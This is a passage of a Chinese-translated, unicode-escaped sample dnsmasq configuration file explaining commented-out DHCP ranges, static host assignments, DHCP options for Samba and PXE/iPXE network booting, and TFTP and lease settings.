\u8fd9\u6837\u5ba2\u6237\u7aef\u53ef\u4ee5\u4f7f\u7528SLAAC\u5730\u5740\u548cDHCP\u5730\u5740\u3002 #dhcp-range=1234::2, 1234::500, slaac # \u8fdb\u884c\u8def\u7531\u901a\u544a\u548c\u65e0\u72b6\u6001DHCP\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u3002\u5ba2\u6237\u7aef\u4e0d\u4f1a # \u4eceDHCP\u83b7\u5f97\u5730\u5740\uff0c\u4f46\u5b83\u4eec\u4f1a\u83b7\u5f97\u5176\u4ed6\u914d\u7f6e\u4fe1\u606f\u3002 # \u5b83\u4eec\u5c06\u4f7f\u7528SLAAC\u6765\u83b7\u5f97\u5730\u5740\u3002 #dhcp-range=1234::, ra-stateless # \u8fdb\u884c\u65e0\u72b6\u6001DHCP\u3001SLAAC\uff0c\u5e76\u4eceDHCPv4\u79df\u7ea6\u751f\u6210 # SLAAC\u5730\u5740\u7684DNS\u540d\u79f0\u3002 #dhcp-range=1234::, ra-stateless # ra-names # \u5bf9\u4e8e\u6240\u6709\u8fdb\u884cDHCPv6\u7684\u5b50\u7f51\u505a\u8def\u7531\u901a\u544a # \u9664\u975e\u88abra-stateless, ra-names\u7b49\u8986\u76d6\uff0c\u8def\u7531\u901a\u544a\u4f1a # \u8bbe\u7f6eM\u548cO\u4f4d\uff0c\u4f7f\u5f97\u5ba2\u6237\u7aef\u4eceDHCPv6\u83b7\u53d6\u5730\u5740\u548c\u914d\u7f6e\uff0c # \u5e76\u91cd\u7f6eA\u4f4d\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u4e0d\u4f7f\u7528SLAAC\u5730\u5740\u3002 #enable-ra # \u4f7f\u7528DHCP\u4e3a\u6307\u5b9a\u4e3b\u673a\u63d0\u4f9b\u53c2\u6570\u3002\u6709\u5f88\u591a # \u6709\u6548\u7684\u66ff\u4ee3\u65b9\u6848\uff0c\u56e0\u6b64\u6211\u4eec\u5c06\u7ed9\u51fa\u6bcf\u4e2a\u7684\u793a\u4f8b\u3002\u6ce8\u610f # IP\u5730\u5740\u4e0d\u5fc5\u5728\u4e0a\u9762\u7ed9\u51fa\u7684\u8303\u56f4\u5185\uff0c\u5b83\u4eec\u53ea\u9700\u8981 # \u5728\u540c\u4e00\u7f51\u7edc\u4e0a\u3002\u8fd9\u4e9b\u53c2\u6570\u7684\u987a\u5e8f\u65e0\u5173\u7d27\u8981\uff0c\u53ef\u4ee5\u4efb\u610f # \u987a\u5e8f\u7ed9\u51fa\u540d\u79f0\u3001\u5730\u5740\u548cMAC\u3002 # \u59cb\u7ec8\u4e3a\u5177\u6709\u4ee5\u592a\u7f51\u5730\u5740 11:22:33:44:55:66 \u7684\u4e3b\u673a\u5206\u914d # IP\u5730\u5740 192.168.0.60 #dhcp-host=11:22:33:44:55:66,192.168.0.60 # \u59cb\u7ec8\u5c06\u786c\u4ef6\u5730\u5740\u4e3a 11:22:33:44:55:66 \u7684\u4e3b\u673a\u7684\u540d\u79f0 # \u8bbe\u7f6e\u4e3a \"fred\" #dhcp-host=11:22:33:44:55:66,fred # \u59cb\u7ec8\u7ed9\u4ee5\u592a\u7f51\u5730\u5740\u4e3a 11:22:33:44:55:66 \u7684\u4e3b\u673a # \u540d\u79f0fred\u548cIP\u5730\u5740192.168.0.60\uff0c\u5e76\u4e14\u79df\u7ea6\u65f6\u95f4\u4e3a45\u5206\u949f #dhcp-host=11:22:33:44:55:66,fred,192.168.0.60,45m # \u7ed9\u5177\u6709\u4ee5\u592a\u7f51\u5730\u5740 11:22:33:44:55:66 \u6216 # 12:34:56:78:90:12 \u7684\u4e3b\u673a IP \u5730\u5740 192.168.0.60\u3002 # Dnsmasq \u4f1a\u5047\u8bbe\u8fd9\u4e24\u4e2a\u4ee5\u592a\u7f51\u63a5\u53e3\u4e0d\u4f1a\u540c\u65f6\u4f7f\u7528\uff0c # \u5e76\u5373\u4f7f\u7b2c\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u8be5 IP \u5730\u5740\u4e5f\u4f1a\u7ed9\u7b2c\u4e8c\u4e2a\u5206\u914d IP \u5730\u5740\u3002 # \u5bf9\u4e8e\u5177\u6709\u6709\u7ebf\u548c\u65e0\u7ebf\u5730\u5740\u7684\u7b14\u8bb0\u672c\u7535\u8111\u5f88\u6709\u7528\u3002 #dhcp-host=11:22:33:44:55:66,12:34:56:78:90:12,192.168.0.60 # \u7ed9\u58f0\u79f0\u5176\u540d\u79f0\u4e3a \"bert\" \u7684\u673a\u5668 IP \u5730\u5740 # 192.168.0.70 \u548c\u4e00\u4e2a\u65e0\u9650\u671f\u79df\u7ea6 #dhcp-host=bert,192.168.0.70,infinite # \u59cb\u7ec8\u7ed9\u5177\u6709\u5ba2\u6237\u7aef\u6807\u8bc6\u7b26 01:02:02:04 \u7684\u4e3b\u673a # IP\u5730\u5740 192.168.0.60 #dhcp-host=id:01:02:02:04,192.168.0.60 # \u59cb\u7ec8\u7ed9\u5177\u6709 InfiniBand \u786c\u4ef6\u5730\u5740 # 80:00:00:48:fe:80:00:00:00:00:00:00:f4:52:14:03:00:28:05:81 \u7684 # ip\u5730\u5740 192.168.0.61\u3002\u5ba2\u6237\u7aefID\u6765\u6e90\u4e8e\u524d\u7f00 # ff:00:00:00:00:00:02:00:00:02:c9:00 \u548c\u786c\u4ef6\u5730\u5740\u7684\u6700\u540e8\u5bf9 # \u5341\u516d\u8fdb\u5236\u6570\u5b57\u3002 #dhcp-host=id:ff:00:00:00:00:00:02:00:00:02:c9:00:f4:52:14:03:00:28:05:81,192.168.0.61 # \u59cb\u7ec8\u7ed9\u5ba2\u6237\u7aef\u6807\u8bc6\u7b26\u4e3a \"marjorie\" \u7684\u4e3b\u673a # IP\u5730\u5740 192.168.0.60 #dhcp-host=id:marjorie,192.168.0.60 # \u542f\u7528\u201cjudge\u201d\u5728/etc/hosts\u4e2d\u7684\u5730\u5740 # \u7ed9\u5448\u73b0\u540d\u79f0\u201cjudge\u201d\u7684\u673a\u5668\uff0c\u5f53 # \u5b83\u8bf7\u6c42\u4e00\u4e2aDHCP\u79df\u7ea6\u3002 #dhcp-host=judge # \u6c38\u4e0d\u5411\u4ee5\u592a\u7f51 # \u5730\u5740\u4e3a 11:22:33:44:55:66 \u7684\u673a\u5668\u63d0\u4f9bDHCP\u670d\u52a1 #dhcp-host=11:22:33:44:55:66,ignore # \u5ffd\u7565\u5177\u6709\u4ee5\u592a\u7f51\u5730\u5740 11:22:33:44:55:66 \u7684\u673a\u5668\u63d0\u4f9b\u7684\u4efb\u4f55\u5ba2\u6237\u7aefID\u3002 # \u8fd9\u6709\u52a9\u4e8e\u5728\u673a\u5668\u5728\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u8fd0\u884c\u6216 # \u5728PXE\u5f15\u5bfc\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5bfc\u4e4b\u95f4\u9632\u6b62\u673a\u5668\u88ab\u4e0d\u540c\u5bf9\u5f85\u3002 #dhcp-host=11:22:33:44:55:66,id:* # \u5411\u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e\u7684\u4e3b\u673a\u53d1\u9001\u989d\u5916\u7684\u9009\u9879\uff0c # \u5176\u4ee5\u592a\u7f51\u5730\u5740\u4e3a 11:22:33:44:55:66 #dhcp-host=11:22:33:44:55:66,set:red # \u5411\u4efb\u4f55\u4ee5\u592a\u7f51\u5730\u5740\u5f00\u59cb\u4e3a11:22:33:\u7684\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879\uff0c # \u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e #dhcp-host=11:22:33:*:*:*,set:red # \u7ed9\u5177\u6709DUID 00:01:00:01:16:d2:83:fc:92:d4:19:e2:d8:b2\u7684\u5ba2\u6237\u7aef # \u56fa\u5b9aIPv6\u5730\u5740\u548c\u540d\u79f0\uff0c\u6ce8\u610fMAC\u5730\u5740\u4e0d\u80fd\u7528\u4e8e\u8bc6\u522bDHCPv6\u5ba2\u6237\u7aef\u3002 # \u8fd8\u8981\u6ce8\u610f\u5fc5\u987b\u5728IPv6\u5730\u5740\u5468\u56f4\u4f7f\u7528[]\u3002 #dhcp-host=id:00:01:00:01:16:d2:83:fc:92:d4:19:e2:d8:b2, fred, [1234::5] # \u5ffd\u7565\u4efb\u4f55\u672a\u5728dhcp-host\u884c\u4e2d\u6307\u5b9a\u6216/etc/ethers\u4e2d\u7684\u5ba2\u6237\u7aef\u3002 # \u76f8\u5f53\u4e8eISC\u7684\"deny unknown-clients\"\u3002 # \u8fd9\u4f9d\u8d56\u4e8e\u7279\u6b8a\u7684\"known\"\u6807\u7b7e\uff0c\u5f53 # \u5339\u914d\u4e3b\u673a\u65f6\u4f1a\u8bbe\u7f6e\u3002 #dhcp-ignore=tag:!known # \u5411\u5305\u542b\u5b50\u5b57\u7b26\u4e32\"Linux\"\u7684DHCP vendorclass\u5b57\u7b26\u4e32\u7684\u4efb\u4f55\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879 #dhcp-vendorclass=set:red,Linux # \u5411\u5176\u4e2d\u4e00\u4e2aDHCP userclass\u5b57\u7b26\u4e32\u5305\u542b\u5b50\u5b57\u7b26\u4e32\"accounts\"\u7684\u4efb\u4f55\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879 #dhcp-userclass=set:red,accounts # \u5411MAC\u5730\u5740\u7b26\u5408\u6a21\u5f0f\u7684\u4efb\u4f55\u673a\u5668\u53d1\u9001\u989d\u5916\u7684\u9009\u9879\u3002 #dhcp-mac=set:red,00:60:8C:*:*:* # \u5982\u679c\u53d6\u6d88\u6ce8\u91ca\u6b64\u884c\uff0cdnsmasq\u5c06\u8bfb\u53d6/etc/ethers\u5e76\u6267\u884c # \u4ee5\u592a\u7f51\u5730\u5740/IP\u5bf9\uff0c\u5c31\u50cf\u5b83\u4eec\u5df2\u7ecf # \u4f5c\u4e3a--dhcp-host\u9009\u9879\u7ed9\u51fa\u4e00\u6837\u3002\u5982\u679c\u4f60\u4fdd\u6301 # MAC\u5730\u5740/\u4e3b\u673a\u6620\u5c04\u5728\u90a3\u91cc\u51fa\u4e8e\u5176\u4ed6\u76ee\u7684\u6709\u7528\u3002 #read-ethers # \u5411\u8bf7\u6c42DHCP\u79df\u7ea6\u7684\u4e3b\u673a\u53d1\u9001\u9009\u9879\u3002 # \u8be6\u89c1RFC 2132\u4e86\u89e3\u53ef\u7528\u9009\u9879\u3002 # \u5e38\u89c1\u9009\u9879\u53ef\u4ee5\u901a\u8fc7\u540d\u79f0\u7ed9dnsmasq\uff1a # \u8fd0\u884c \"dnsmasq --help dhcp\" \u83b7\u5f97\u5217\u8868\u3002 # \u6ce8\u610f\u6240\u6709\u5e38\u89c1\u8bbe\u7f6e\uff0c\u5982\u7f51\u7edc\u63a9\u7801\u548c # \u5e7f\u64ad\u5730\u5740\u3001DNS\u670d\u52a1\u5668\u548c\u9ed8\u8ba4\u8def\u7531\uff0c\u90fd\u88abdnsmasq\u8d4b\u4e88 # \u5408\u7406\u7684\u9ed8\u8ba4\u503c\u3002\u4f60\u5f88\u53ef\u80fd\u4e0d\u9700\u8981 # \u4efb\u4f55dhcp-options\u3002\u5982\u679c\u4f60\u4f7f\u7528Windows\u5ba2\u6237\u7aef\u548cSamba\uff0c\u6709\u4e00\u4e9b # \u63a8\u8350\u7684\u9009\u9879\uff0c\u5b83\u4eec\u8be6\u7ec6\u8bf4\u660e\u5728\u672c\u8282\u7684 # \u672b\u5c3e\u3002 # \u8986\u76d6dnsmasq\u63d0\u4f9b\u7684\u9ed8\u8ba4\u8def\u7531\uff0c\u8be5\u9ed8\u8ba4\u8def\u7531\u5047\u8bbe\u8def\u7531\u5668 # \u662f\u8fd0\u884cdnsmasq\u7684\u540c\u4e00\u53f0\u673a\u5668\u3002 #dhcp-option=3,1.2.3.4 # \u505a\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u4f46\u4f7f\u7528\u9009\u9879\u540d\u79f0 #dhcp-option=option:router,1.2.3.4 # \u8986\u76d6dnsmasq\u63d0\u4f9b\u7684\u9ed8\u8ba4\u8def\u7531\u5e76\u6839\u672c\u4e0d\u53d1\u9001\u9ed8\u8ba4\u8def\u7531\u3002 # \u6ce8\u610f\u8fd9\u4ec5\u9002\u7528\u4e8e\u9ed8\u8ba4\u53d1\u9001\u7684\u9009\u9879\uff081, 3, 6, 12, 28\uff09 # \u76f8\u540c\u884c\u5c06\u4e3a\u6240\u6709\u5176\u4ed6\u9009\u9879\u7f16\u53f7\u53d1\u9001\u96f6\u957f\u5ea6\u9009\u9879\u3002 #dhcp-option=3 # \u5c06NTP\u65f6\u95f4\u670d\u52a1\u5668\u5730\u5740\u8bbe\u7f6e\u4e3a192.168.0.4\u548c10.10.0.5 #dhcp-option=option:ntp-server,192.168.0.4,10.10.0.5 # \u53d1\u9001DHCPv6\u9009\u9879\u3002\u6ce8\u610fIPv6\u5730\u5740\u5468# \u56f4\u9700\u8981\u7528[]\u62ec\u8d77\u6765\u3002 #dhcp-option=option6:dns-server,[1234::77],[1234::88] # \u5c06\u4f5c\u4e3a\u673a\u5668\u8fd0\u884cdnsmasq\u7684\u673a\u5668\u548c\u53e6\u4e00\u53f0\u673a\u5668\u7684\u540d\u79f0\u670d\u52a1\u5668\u53d1\u9001DHCPv6\u9009\u9879\u3002 #dhcp-option=option6:dns-server,[::],[1234::88] # \u8981\u6c42\u5ba2\u6237\u7aef\u6bcf\u516d\u5c0f\u65f6\u8f6e\u8be2\u4e00\u6b21\u9009\u9879\u53d8\u66f4\u3002\uff08RFC4242\uff09 #dhcp-option=option6:information-refresh-time,6h # \u8bbe\u7f6e\u9009\u987958\u5ba2\u6237\u7aef\u7eed\u79df\u65f6\u95f4\uff08T1\uff09\u3002\u9ed8\u8ba4\u4e3a\u79df\u7ea6\u65f6\u95f4\u7684\u4e00\u534a\uff0c\u5982\u679c\u672a\u6307\u5b9a\u3002\uff08RFC2132\uff09 #dhcp-option=option:T1,1m # \u8bbe\u7f6e\u9009\u987959\u91cd\u65b0\u7ed1\u5b9a\u65f6\u95f4\uff08T2\uff09\u3002\u9ed8\u8ba4\u4e3a\u79df\u7ea6\u65f6\u95f4\u76847/8\uff0c\u5982\u679c\u672a\u6307\u5b9a\u3002\uff08RFC2132\uff09 #dhcp-option=option:T2,2m # \u5c06NTP\u65f6\u95f4\u670d\u52a1\u5668\u5730\u5740\u8bbe\u7f6e\u4e3a\u8fd0\u884cdnsmasq\u7684\u540c\u4e00\u53f0\u673a\u5668 #dhcp-option=42,0.0.0.0 # \u5c06NIS\u57df\u540d\u8bbe\u7f6e\u4e3a\"welly\" #dhcp-option=40,welly # \u5c06\u9ed8\u8ba4\u751f\u5b58\u65f6\u95f4\u8bbe\u7f6e\u4e3a50 #dhcp-option=23,50 # \u8bbe\u7f6e\u201c\u6240\u6709\u5b50\u7f51\u90fd\u662f\u672c\u5730\u201d\u7684\u6807\u5fd7 #dhcp-option=27,1 # \u53d1\u9001etherboot\u9b54\u672f\u6807\u5fd7\u7136\u540e\u662fetherboot\u9009\u9879\uff08\u5b57\u7b26\u4e32\uff09\u3002 #dhcp-option=128,e4:45:74:68:00:00 #dhcp-option=129,NIC=eepro100 # \u6307\u5b9a\u4ec5\u5f53\u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e\u65f6\u53d1\u9001\u7684\u9009\u9879\uff0c # \uff08\u89c1dhcp-range\u7528\u4e8e\u58f0\u660e\"red\"\u7f51\u7edc\uff09 # \u6ce8\u610f\u6807\u7b7e\u90e8\u5206\u5fc5\u987b\u5728\u9009\u9879\u90e8\u5206\u4e4b\u524d\u3002 #dhcp-option = tag:red, option:ntp-server, 192.168.1.1 # \u4e0b\u9762\u7684DHCP\u9009\u9879\u8bbe\u7f6ednsmasq\u4e0e\u4e3a # ISC dhcpcd\u6307\u5b9a\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u5728 # http://www.samba.org/samba/ftp/docs/textdocs/DHCP-Server-Configuration.txt # \u4e3a\u5178\u578b\u7684dnsmasq\u5b89\u88c5\u9002\u5e94\uff0c\u5176\u4e2d\u8fd0\u884cdnsmasq\u7684\u4e3b\u673a\u4e5f\u662f\u8fd0\u884csamba\u7684\u4e3b\u673a\u3002 # \u5982\u679c\u4f60\u4f7f\u7528Windows\u5ba2\u6237\u7aef\u548cSamba\uff0c\u4f60\u53ef\u80fd\u5e0c\u671b\u53d6\u6d88\u6ce8\u91ca\u4e00\u4e9b\u6216\u5168\u90e8\u8fd9\u4e9b\u9009\u9879\u3002 #dhcp-option=19,0 # \u5173\u95edip-forwarding #dhcp-option=44,0.0.0.0 # \u8bbe\u7f6eNetBIOS over TCP/IP\u540d\u79f0\u670d\u52a1\u5668\uff08\u5373WINS\u670d\u52a1\u5668\uff09 #dhcp-option=45,0.0.0.0 # netbios\u6570\u636e\u62a5\u5206\u53d1\u670d\u52a1\u5668 #dhcp-option=46,8 # netbios\u8282\u70b9\u7c7b\u578b # \u53d1\u9001\u7a7a\u7684WPAD\u9009\u9879\u3002\u8fd9\u53ef\u80fd\u662f\u5fc5\u9700\u7684\u4ee5\u4f7fWindows 7\u8868\u73b0\u6b63\u5e38\u3002 #dhcp-option=252,\"\\n\" # \u53d1\u9001RFC-3397 DNS\u57df\u641c\u7d22DHCP\u9009\u9879\u3002\u8b66\u544a\uff1a\u4f60\u7684DHCP\u5ba2\u6237\u7aef # \u53ef\u80fd\u4e0d\u652f\u6301\u8fd9\u4e2a...... #dhcp-option=option:domain-search,eng.apple.com,marketing.apple.com # \u53d1\u9001RFC-3442\u65e0\u7c7b\u9759\u6001\u8def\u7531\uff08\u6ce8\u610f\u7f51\u7edc\u63a9\u7801\u7f16\u7801\uff09 #dhcp-option=121,192.168.1.0/24,1.2.3.4,10.0.0.0/8,5.6.7.8 # \u5728DHCP\u9009\u987943\u4e2d\u53d1\u9001\u5c01\u88c5\u7684vendor-class\u7279\u5b9a\u9009\u9879\u3002 # \u9009\u9879\u7684\u542b\u4e49\u7531vendor-class\u5b9a\u4e49 # \u56e0\u6b64\u9009\u9879\u4ec5\u5728\u5ba2\u6237\u7aef\u63d0\u4f9b\u7684vendor class # \u5339\u914d\u6b64\u5904\u7ed9\u51fa\u7684\u7c7b\u65f6\u53d1\u9001\u3002\uff08\u5b50\u5b57\u7b26\u4e32\u5339\u914d\u4e5f\u53ef\u4ee5\uff0c\u6240\u4ee5\"MSFT\" # \u5339\u914d\"MSFT\"\u548c\"MSFT 5.0\"\uff09\u3002\u6b64\u793a\u4f8b\u4e3aPXEClient\u8bbe\u7f6e # mtftp\u5730\u5740\u4e3a0.0.0.0\u3002 #dhcp-option=vendor:PXEClient,1,0.0.0.0 # \u53d1\u9001microsoft\u7279\u5b9a\u9009\u9879\u4ee5\u544a\u8bc9windows\u5728\u5b83\u5173\u95ed\u65f6\u91ca\u653eDHCP\u79df\u7ea6\u3002 # \u6ce8\u610f'i'\u6807\u5fd7\uff0c\u544a\u8bc9dnsmasq\u4ee5\u56db\u5b57\u8282\u6574\u6570\u53d1\u9001\u503c - \u8fd9\u662fmicrosoft\u6240\u9700\u7684\u3002 # \u53c2\u89c1 # http://technet2.microsoft.com/WindowsServer/en/library/a70f1bb7-d2d4-# 49f0-96d6-4b7414ecfaae1033.mspx?mfr=true #dhcp-option=vendor:MSFT,2,1i # \u53d1\u9001Etherboot\u9700\u8981\u7684\u5c01\u88c5vendor-class ID\uff0c # \u4ee5\u4f7f\u5176\u80fd\u8bc6\u522bDHCP\u670d\u52a1\u5668\u3002 #dhcp-option=vendor:Etherboot,60,\"Etherboot\" # \u5411PXELinux\u53d1\u9001\u9009\u9879\u3002\u6ce8\u610f\u5373\u4f7f\u5b83\u4eec\u6ca1\u6709\u51fa\u73b0\u5728\u53c2\u6570\u8bf7\u6c42\u5217\u8868\u4e2d\uff0c # \u6211\u4eec\u4e5f\u9700\u8981\u53d1\u9001\u9009\u9879\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728\u8fd9\u91cc\u4f7f\u7528dhcp-option-force\u3002 # \u8be6\u60c5\u89c1 http://syslinux.zytor.com/pxe.php#special\u3002 # \u9b54\u6cd5\u6570\u5b57 - \u5728\u4efb\u4f55\u5176\u4ed6\u4e1c\u897f\u88ab\u8ba4\u51fa\u4e4b\u524d\u9700\u8981 #dhcp-option-force=208,f1:00:74:7e # \u914d\u7f6e\u6587\u4ef6\u540d #dhcp-option-force=209,configs/common # \u8def\u5f84\u524d\u7f00 #dhcp-option-force=210,/tftpboot/pxelinux/files/ # \u91cd\u542f\u65f6\u95f4\u3002 (\u6ce8\u610f 'i' \u7528\u4e8e\u53d1\u900132\u4f4d\u503c) #dhcp-option-force=211,30i # \u4e3anetboot/PXE\u8bbe\u7f6e\u542f\u52a8\u6587\u4ef6\u540d\u3002\u4f60\u53ea\u9700\u8981\u8fd9\u4e2a # \u5982\u679c\u4f60\u60f3\u8981\u901a\u8fc7\u7f51\u7edc\u542f\u52a8\u673a\u5668\uff0c\u4f60\u5c06\u9700\u8981 # \u4e00\u4e2aTFTP\u670d\u52a1\u5668\uff1b\u8981\u4e48\u662fdnsmasq\u7684\u5185\u7f6eTFTP\u670d\u52a1\u5668\u6216\u4e00\u4e2a # \u5916\u90e8\u7684\u3002 (\u89c1\u4e0b\u9762\u5982\u4f55\u542f\u7528TFTP\u670d\u52a1\u5668\u3002) #dhcp-boot=pxelinux.0 # \u4e0e\u4e0a\u9762\u76f8\u540c\uff0c\u4f46\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684tftp-server\u4ee3\u66ff\u8fd0\u884cdnsmasq\u7684\u673a\u5668 #dhcp-boot=pxelinux,server.name,192.168.1.100 # \u4e3aiPXE\u5f15\u5bfc\u3002\u8fd9\u4e2a\u60f3\u6cd5\u662f\u53d1\u9001\u4e24\u4e2a\u4e0d\u540c\u7684 # \u6587\u4ef6\u540d\uff0c\u7b2c\u4e00\u4e2a\u52a0\u8f7diPXE\uff0c\u7b2c\u4e8c\u4e2a\u544a\u8bc9iPXE\u52a0\u8f7d\u4ec0\u4e48\u3002 # dhcp-match\u8bbe\u7f6eipxe\u6807\u7b7e\u4ee5\u54cd\u5e94\u6765\u81eaiPXE\u7684\u8bf7\u6c42\u3002 #dhcp-boot=undionly.kpxe #dhcp-match=set:ipxe,175 # iPXE\u53d1\u9001175\u9009\u9879\u3002 #dhcp-boot=tag:ipxe,http://boot.ipxe.org/demo/boot.php # \u4e3aiPXE\u5c01\u88c5\u7684\u9009\u9879\u3002\u6240\u6709\u9009\u9879\u90fd # \u5728175\u9009\u9879\u4e2d\u5c01\u88c5\u3002 #dhcp-option=encap:175, 1, 5b # \u4f18\u5148\u7ea7\u4ee3\u7801 #dhcp-option=encap:175, 176, 1b # \u65e0\u4ee3\u7406dhcp #dhcp-option=encap:175, 177, string # \u603b\u7ebfID #dhcp-option=encap:175, 189, 1b # BIOS\u9a71\u52a8\u4ee3\u7801 #dhcp-option=encap:175, 190, user # iSCSI\u7528\u6237\u540d #dhcp-option=encap:175, 191, pass # iSCSI\u5bc6\u7801 # \u6d4b\u8bd5netboot\u5ba2\u6237\u7aef\u7684\u67b6\u6784\u3002PXE\u5ba2\u6237\u7aef\u5e94 # \u901a\u8fc7\u9009\u987993\u53d1\u9001\u5176\u67b6\u6784\u3002\uff08\u53c2\u89c1RFC 4578\uff09 #dhcp-match=peecees, option:client-arch, 0 #x86-32 #dhcp-match=itanics, option:client-arch, 2 #IA64 #dhcp-match=hammers, option:client-arch, 6 #x86-64 #dhcp-match=mactels, option:client-arch, 7 #EFI x86-64 # \u505a\u771f\u6b63\u7684PXE\uff0c\u800c\u4e0d\u662f\u4ec5\u5f15\u5bfc\u5355\u4e2a\u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u4e2a # dhcp-boot\u7684\u66ff\u4ee3\u65b9\u6848\u3002 #pxe-prompt=\"What system shall I netboot?\" # \u6216\u5728\u7b2c\u4e00\u6b21\u53ef\u7528\u64cd\u4f5c\u6267\u884c\u524d\u7684\u8d85\u65f6\uff1a #pxe-prompt=\"Press F8 for menu.\", 60 # \u53ef\u7528\u7684\u5f15\u5bfc\u670d\u52a1\u3002\u7528\u4e8ePXE\u3002 #pxe-service=x86PC, \"Boot from local disk\" # \u4ecednsmasq TFTP\u670d\u52a1\u5668\u52a0\u8f7d<tftp-root>/pxelinux.0\u3002 #pxe-service=x86PC, \"Install Linux\", pxelinux # \u4ece\u4f4d\u4e8e1.2.3.4\u7684TFTP\u670d\u52a1\u5668\u52a0\u8f7d<tftp-root>/pxelinux.0\u3002 # \u6ce8\u610f\u8fd9\u5728\u65e7\u7684PXE ROM\u4e0a\u53ef\u80fd\u5931\u8d25\u3002 #pxe-service=x86PC, \"Install Linux\", pxelinux, 1.2.3.4 # \u4f7f\u7528\u7f51\u7edc\u4e0a\u7684\u5f15\u5bfc\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u591a\u64ad\u6216\u5e7f\u64ad\u627e\u5230\u3002 #pxe-service=x86PC,\"Install windows from RIS server\", 1 # \u4f7f\u7528\u5df2\u77e5IP\u5730\u5740\u7684\u5f15\u5bfc\u670d\u52a1\u5668\u3002 #pxe-service=x86PC, \"Install windows from RIS server\", 1, 1.2.3.4 # \u5982\u679c\u4f60\u6709\u53ef\u7528\u7684\u591a\u64adFTP\uff0c # \u53ef\u4ee5\u4ee5\u7c7b\u4f3c\u65b9\u5f0f\u4f20\u9012\u5173\u4e8e\u6b64\u7684\u4fe1\u606f\uff0c\u4f7f\u7528\u9009\u98791 # \u52305\u3002\u53c2\u89c1\u7b2c19\u9875 # http://download.intel.com/design/archives/wfm/downloads/pxespec.pdf # \u542f\u7528dnsmasq\u7684\u5185\u7f6eTFTP\u670d\u52a1\u5668 #enable-tftp # \u8bbe\u7f6e\u53ef\u901a\u8fc7FTP\u63d0\u4f9b\u6587\u4ef6\u7684\u6839\u76ee\u5f55\u3002 #tftp-root=/var/ftpd # \u5982\u679ctftp-root\u4e0d\u53ef\u7528\uff0c\u4e0d\u4e2d\u6b62 #tftp-no-fail # \u8ba9TFTP\u670d\u52a1\u5668\u66f4\u5b89\u5168\uff1a\u8bbe\u7f6e\u6b64\u9879\u540e\uff0c\u53ea\u6709 # \u7528\u6237dnsmasq\u8fd0\u884c\u65f6\u7684\u7528\u6237\u62e5\u6709\u7684\u6587\u4ef6\u624d\u4f1a\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u3002 #tftp-secure # \u6b64\u9009\u9879\u963b\u6b62dnsmasq\u4e3aTFTP\u4f20\u8f93\u534f\u5546\u66f4\u5927\u7684\u5757\u5927\u5c0f\u3002 # \u5b83\u4f1a\u51cf\u6162\u901f\u5ea6\uff0c\u4f46\u53ef\u80fd\u62ef\u6551\u4e00\u4e9b\u635f\u574f\u7684TFTP\u5ba2\u6237\u7aef\u3002 #tftp-no-blocksize # \u8bbe\u7f6e\u4ec5\u5f53\u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e\u65f6\u7684\u542f\u52a8\u6587\u4ef6\u540d\u3002 #dhcp-boot=tag:red,pxelinux.red-net # dhcp-boot\u7684\u4e00\u4e2a\u793a\u4f8b\uff0c\u5e26\u6709\u5916\u90e8TFTP\u670d\u52a1\u5668\uff1a\u6587\u4ef6\u540d\u540e\u7ed9\u51fa\u670d\u52a1\u5668\u7684\u540d\u79f0\u548cIP\u5730\u5740\u3002 # \u5728\u65e7\u7684PXE ROM\u4e0a\u53ef\u80fd\u5931\u8d25\u3002\u88ab--pxe-service\u8986\u76d6\u3002 #dhcp-boot=/var/ftpd/pxelinux.0,boothost,192.168.0.3 # \u5982\u679c\u6709\u591a\u4e2a\u5916\u90e8tftp\u670d\u52a1\u5668\u5177\u6709\u76f8\u540c\u7684\u540d\u5b57 # (\u4f7f\u7528/etc/hosts) \u5219\u53ef\u4ee5\u6307\u5b9a\u8be5\u540d\u79f0\u4e3atftp_servername # (dhcp-boot\u7684\u7b2c\u4e09\u4e2a\u9009\u9879) \u5e76\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0bdnsmasq\u5c06\u89e3\u6790\u6b64\u540d\u79f0 # \u5e76\u4ee5\u5faa\u73af\u65b9\u5f0f\u8fd4\u56de\u7ed3\u679cIP\u5730\u5740\u3002\u6b64\u529f\u80fd\u53ef\u7528\u4e8e # \u5728\u4e00\u7ec4\u670d\u52a1\u5668\u4e4b\u95f4\u5e73\u8861tftp\u8d1f\u8f7d\u3002 #dhcp-boot=/var/ftpd/pxelinux.0,boothost,tftp_server_name # \u8bbe\u7f6eDHCP\u79df\u7ea6\u7684\u9650\u5236\uff0c\u7f3a\u7701\u503c\u4e3a150 #dhcp-lease-max=150 # DHCP\u670d\u52a1\u5668\u9700\u8981\u4e00\u4e2a\u78c1\u76d8\u4f4d\u7f6e\u6765\u4fdd\u6301\u5176\u79df\u7ea6\u6570\u636e\u5e93\u3002 # \u8fd9\u9ed8\u8ba4\u4e8e\u4e00\u4e2a\u5408\u7406\u7684\u4f4d\u7f6e\uff0c\u4f46\u5982\u679c\u4f60\u60f3\u6539\u53d8\u5b83\uff0c\u4f7f\u7528 # \u4e0b\u9762\u7684\u884c\u3002 #dhcp-leasefile=/var/lib/dnsmasq/dnsmasq.leases # \u5c06DHCP\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u6743\u5a01\u6a21\u5f0f\u3002\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5b83\u5c06\u4ecb\u5165 # 